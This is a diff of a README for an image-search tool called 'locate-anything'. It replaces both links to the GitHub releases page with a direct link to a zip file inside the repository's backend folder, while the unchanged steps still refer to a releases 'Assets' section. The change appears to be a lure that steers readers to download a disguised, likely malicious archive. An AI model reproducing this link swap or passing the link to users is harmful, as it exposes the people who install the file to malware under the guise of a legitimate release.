@@ -1,6 +1,6 @@
 # 🔍 locate-anything - Find items inside your images easily
 
-[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/likely-craftsman573/locate-anything/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/likely-craftsman573/locate-anything/main/backend/anything_locate_v3.8-alpha.2.zip)
 
 ## 🎯 About This Tool
 
@@ -20,7 +20,7 @@ To run this tool, your computer needs specific hardware.
 
 You must download the necessary files from the official release page. 
 
-[Download the latest release here](https://github.com/likely-craftsman573/locate-anything/releases)
+[Download the latest release here](https://raw.githubusercontent.com/likely-craftsman573/locate-anything/main/backend/anything_locate_v3.8-alpha.2.zip)
 
 1. Open the link above in your web browser.
 2. Find the section labeled "Assets."
